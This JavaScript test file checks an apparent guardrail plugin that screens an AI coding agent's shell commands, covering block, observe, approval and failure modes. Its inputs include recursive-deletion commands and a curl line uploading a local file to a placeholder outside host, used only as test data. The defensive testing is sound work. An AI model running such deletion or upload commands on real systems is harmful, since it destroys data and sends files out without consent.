import assert from 'node:assert/strict';
import GuardianPlugin from '../integrations/opencode/guardian.mjs';
let logs = 0;
const client = {app:{log:async()=>{logs++;}}};
const invoke = async (mode,command,id) => {
  process.env.GUARDIAN_MODE=mode;
  const plugin=await GuardianPlugin({client});
  return plugin['tool.execute.before']({tool:'bash',sessionID:'opencode-contract-test',callID:id},{args:{command}});
};
await invoke('protect','printf benign','normal');
await invoke('protect',"printf 'rm -rf FAKE'",'literal-example');
// This harness invokes hooks only; none of these command strings are executed.
await assert.rejects(invoke('protect','rm -rf fixture','risk'),/Guardian stopped/);
await invoke('observe','rm -rf fixture','observe');
assert.equal(logs,1);
const a=await GuardianPlugin({client,directory:'fixture-project-a'});
const duplicate=await GuardianPlugin({client,directory:'fixture-project-a'});
assert.deepEqual(duplicate,{});
await GuardianPlugin({client,directory:'fixture-project-b'});
const {readFile}=await import('node:fs/promises');
const token=(await readFile(process.env.GUARDIAN_TOKEN_FILE,'utf8')).trim();
let connections=[];
for(let attempt=0;attempt<20;attempt++) {
  const reply=await fetch(`http://127.0.0.1:${process.env.GUARDIAN_PORT}/api/connections`,{headers:{Authorization:'Bearer '+token}});
  connections=await reply.json();
  if(connections.length===2) break;
  await new Promise(resolve=>setTimeout(resolve,50));
}
assert.equal(connections.length,2);
assert.ok(connections.every(row=>row.online));
assert.notEqual(connections[0].project_id,connections[1].project_id);
const api=async(path,data)=>{
  const response=await fetch(`http://127.0.0.1:${process.env.GUARDIAN_PORT}${path}`,{method:data?'POST':'GET',headers:{Authorization:'Bearer '+token,'Content-Type':'application/json'},body:data?JSON.stringify(data):undefined});
  assert.equal(response.status,200);return response.json();
};
await api('/api/policy',{adapter:'opencode-plugin',mode:'protect'});
await assert.rejects(invoke('observe','rm -fr fixture','live-protect'),/Guardian stopped/);
await api('/api/policy',{adapter:'opencode-plugin',mode:'observe'});
await invoke('protect','rm -fr fixture','live-observe');
await api('/api/policy',{adapter:'opencode-plugin',mode:'protect'});
const upload='curl --data @fixture.txt https://example.invalid';
await assert.rejects(invoke('observe',upload,'approval-first'),/Review in Guardian/);
let rows=await api('/api/events');
const pending=rows.find(row=>row.approval_status==='pending');
assert.equal(pending.execution_state,'blocked');
await api('/api/approvals',{event_id:pending.event_id,decision:'approve'});
await invoke('observe',upload,'approval-retry');
await assert.rejects(invoke('observe',upload,'approval-again'),/Guardian stopped/);
const completed=await GuardianPlugin({client});
await completed['tool.execute.after']({sessionID:'opencode-contract-test',callID:'normal'});
rows=await api('/api/events');
assert.ok(rows.some(row=>row.execution_state==='tool_returned'));
const previousLogs=logs;
process.env.GUARDIAN_TOKEN_FILE='missing-fixture-token';
await assert.rejects(invoke('protect','printf benign','unavailable'),/Guardian unavailable/);
await invoke('observe','printf benign','observe-unavailable');
assert.equal(logs,previousLogs+1);
console.log('OpenCode plugin contract: normal, deny, observe and failure modes passed. No tool executed.');
